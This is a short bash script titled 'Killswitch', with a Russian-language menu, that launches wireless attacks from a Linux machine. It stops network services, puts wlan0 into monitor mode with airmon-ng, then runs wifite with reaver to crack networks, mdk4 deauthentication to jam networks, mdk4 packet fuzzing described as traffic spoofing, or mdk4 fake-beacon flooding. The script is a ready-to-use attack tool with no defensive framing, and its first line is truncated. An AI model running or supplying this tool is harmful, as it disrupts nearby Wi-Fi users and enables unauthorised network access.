#!/bin/b          
clear

echo "      /\\"
echo "     /  \\	        Killswitch"
echo "    /\\   \\	-------------------------"
echo "   /      \\	Authors: RЫBOLOV, FOXDRON"
echo "  /   ,,   \\	OS: Linux"
echo " /   |  |  -\\	Date: `date`"
echo "/_-''    ''-_\\"
echo " "
echo " "
echo "1. Запуск Wifite"
echo "2. Глушилка сетей"
echo "3. Подмена сетевого трафика"
echo "4. Создание фантомов"
echo " "
echo "Введите номер команды: "
read command

if [ $command == 1 ]; then
clear
service NetworkManager stop
service wpa_supplicant stop
wifite -reaver
clear
echo "Repairing adapter..."
service NetworkManager start
service wpa_supplicant start
echo "Network Manager started!"

elif [ $command == 2 ]; then
clear
echo "Killing adapter..."
service NetworkManager stop
service wpa_supplicant stop
clear
echo "Monitor mode..."
airmon-ng check kill
airmon-ng start wlan0
clear
mdk4 wlan0 d

elif [ $command == 3 ]; then
clear
echo "Killing adapter..."
service NetworkManager stop
service wpa_supplicant stop
clear
echo "Monitor mode..."
airmon-ng check kill
airmon-ng start wlan0
clear
mdk4 wlan0 f -sap -m bmstm -p 400

elif [ $command == 4 ]; then
clear
echo "Killing adapter..."
service NetworkManager stop
service wpa_supplicant stop
clear
echo "Monitor mode..."
airmon-ng check kill
airmon-ng start wlan0
clear
mdk4 wlan0 b -ams 500

fi
